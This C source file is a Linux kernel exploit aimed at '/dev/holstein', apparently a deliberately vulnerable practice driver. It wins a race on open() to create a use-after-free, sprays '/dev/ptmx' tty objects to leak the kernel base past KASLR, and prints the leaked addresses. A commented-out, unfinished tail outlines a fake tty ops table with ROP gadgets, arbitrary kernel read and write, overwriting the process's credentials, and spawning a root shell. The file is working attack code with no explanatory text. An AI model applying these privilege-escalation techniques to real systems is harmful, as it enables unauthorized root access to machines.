#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <pthread.h>

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define SUCCESS(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

#define ofs_tty_ops 0xc3afe0
#define addr_modprobe_path (kbase + 0xe38480)
#define rop_mov_qrdx_rcx (kbase + 0x48687)
#define rop_mov_rax_qrdx (kbase + 0x3aadf9)

uint64_t kbase, g_buf1;
char buf[0x400];
char win = 0;
uint32_t fd = 3, fd_dub = 4;
uint32_t fd_victim;

void* race(void *args)
{
    while (1) {
        while (!win) {
            int fd = open("/dev/holstein", O_RDWR);
            if (fd == 4)
                win = 1;
            if (win == 0 && fd != -1)
                close(fd);
        }

        // double check in case of self race condition
        if (write(3, "A", 1) != 1 || write(4, "a", 1) != 1) {
            close(3);
            close(4);
            win = 0;
        } else {
            break;
        }
    }

    return NULL;
}

void* spray_thread(void *args) {
    uint32_t spray[800];
    uint64_t x;

    for (int i = 0; i < 800; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1) {
            ERROR("/dev/ptmx");
            for (int j = 0; j < i; j++) {
                close(spray[j]);
            }
            return (void *)-1;
        }

        if (read(fd, &x, sizeof(uint64_t)) == sizeof(uint64_t) && x) {

            for (int j = 0; j < i; j++) {
                close(spray[j]);
            }
            return (void *)spray[i];
        }
    }

    for (int i = 0; i < 800; i++) {
        close(spray[i]);
    }
    return (void *)-1;
}

int main()
{

    pthread_t th1, th2;

    pthread_create(&th1, NULL, race, NULL);
    pthread_create(&th2, NULL, race, NULL);
    pthread_join(th1, NULL);
    pthread_join(th2, NULL);

    write(fd, "Hello, World!", 14);
    read(fd_dub, buf, 14);
    if (strcmp(buf, "Hello, World!") != 0) {
        ERROR("Bad luck!");
        exit(1);
    } else {
        SUCCESS("raced");
    }

    memset(buf, 0, 0x8);
    write(fd, buf, 0x8);

    close(fd_dub);
    fd_victim = -1;
    fd_victim = (uint64_t)spray_thread(NULL);

    while(fd_victim == -1) {
        INFO("Spraying on another CPU ...");
        pthread_create(&th1, NULL, spray_thread, NULL);
        pthread_join(th1, (void*)&fd_victim);
    }

    // KASLRの回避
    read(fd, buf, 0x400);

    kbase = *(uint64_t*)&buf[0x18] - ofs_tty_ops;
    g_buf1 = *(uint64_t*)&buf[0x38] - 0x38;

    printf("[+] kbase = 0x%016lx\n", kbase);
    printf("[+] g_buf1 = 0x%016lx\n", g_buf1);
    // END KASLRの回避

    return 0;

    // // fake ops table
    // uint64_t* p = (uint64_t*)&buf;
    // p[12] = rop_mov_qrdx_rcx; // aaw: overwrite ops table with &buf
    // p[13] = rop_mov_rax_qrdx; // aar: overwrite ops table with &buf[0x8]
    // write(fd1, buf, 0x400);

    // // 2回目のUse-after-Free
    // fd2 = open("/dev/holstein", O_RDWR);
    // fd2_dup = open("/dev/holstein", O_RDWR);
    // if (fd2 == -1 || fd2_dup == -1)
    //     ERROR("/dev/holstein");

    // close(fd2_dup);

    // for (int i = 50; i < 100; i++) {
    //     spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    //     if (spray[i] == -1)
    //         ERROR("/dev/ptmx");
    // }

    // // aar, aaw available

    // // find curernt task_struct
    // if (prctl(PR_SET_NAME, "nekomaru") != 0)
    //     ERROR("/prctl");

    // uint64_t addr;

    // INFO("searching from 0x%016lx", g_buf1 - 0x1000000);
    // for (addr = g_buf1 - 0x1000000;; addr += 0x8) {
    //     if ((addr & 0xfffff) == 0) {
    //         INFO("searching... 0x%016lx", addr);
    //     }

    //     if (AAR32(addr) == 0x6f6b656e && AAR32(addr + 0x4) == 0x7572616d) {
    //         SUCCESS("Found 'comm' at 0x%016lx", addr);
    //         break;
    //     }
    // }

    // uint64_t addr_cred = 0;
    // addr_cred = AAR32(addr - 0x8);
    // addr_cred |= (uint64_t)AAR32(addr - 0x4) << 32;
    // SUCCESS("current->cred = 0x%016lx", addr_cred);

    // // 実効IDの上書き
    // for (int i = 1; i <= 8; i++) {
    //     AAW32(addr_cred + i * 4, 0);
    // }

    // SUCCESS("pwned!");
    // system("/bin/sh");

    return 0;
}